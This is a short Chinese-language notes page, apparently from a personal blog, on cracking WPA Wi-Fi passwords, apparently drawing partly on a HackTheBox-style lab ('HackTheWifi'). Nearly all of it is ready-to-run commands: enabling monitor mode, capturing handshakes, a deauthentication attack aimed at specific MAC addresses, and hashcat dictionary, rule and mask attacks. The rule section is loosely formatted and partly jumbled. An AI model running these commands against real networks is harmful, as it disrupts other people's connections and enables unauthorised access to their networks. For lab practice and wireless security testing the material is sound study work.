---
title: WIFI 密码破解
date: 2025-08-31
draft: false
tags: 
hidden: false
comments: false
---



主要步骤
1、发现wifi
2、握手捕获
3、密码破解
4、访问验证

## 发现wifi

开启监控模式
```
sudo airmon-ng start wlan0
```

airodump 扫描可用wifi
```
sudo airodump-ng wlan0mon -c 1 -w WPA
```

执行取消身份验证攻击
```
sudo aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0
```

接下来，使用hashcat进行密码，破解。首先需要转换为hashcat可接受的格式
```
hcxpcapngtool -o hash wpa-Induction.pcap
```

保存后，查看hash文件是否符合预期
```
cat hash
```

使用密码字典进行暴力破解
```
hashcat -m 22000 --force hash /opt/wordlist.txt
```

一旦破解成功，下面的命令将展示破解后的密码和哈希
```
hashcat -m 22000 --force hash /opt/wordlist.txt --show
```

使用One进行破解密码
```
 hashcat -m 22000 hackme_hash /opt/wordlist.txt -r /usr/share/hashcat/rules/
```

使用自定义规则破解密码
```
T1ss$sbBZ3

将第二个字符大写
将s替换为$
将b大写
重复最后3个字符
```


```
?s
?l
?u
?l
?d
?l
?a?a

?s?l?u?l?d?l?a?a


破解名为“HackTheWifi”的Wi-Fi网络。密码长度为8到16个字符，前四个字符为“B4ll”，其余字符为小写ASCII字母。


hashcat -a 3 -m 22000 htb_hash2 --increment --increment-min 8 --increment-max=14 'B4ll?l?l?l?l?l?l?l?l?l?l'
```

Windows下调用GPU破解
```
.\hashcat.exe --backend-ignore-cuda -w 3 -m 22000 -a 6 ..\hash.txt ..\wordlist.txt ?d?d?d?d
```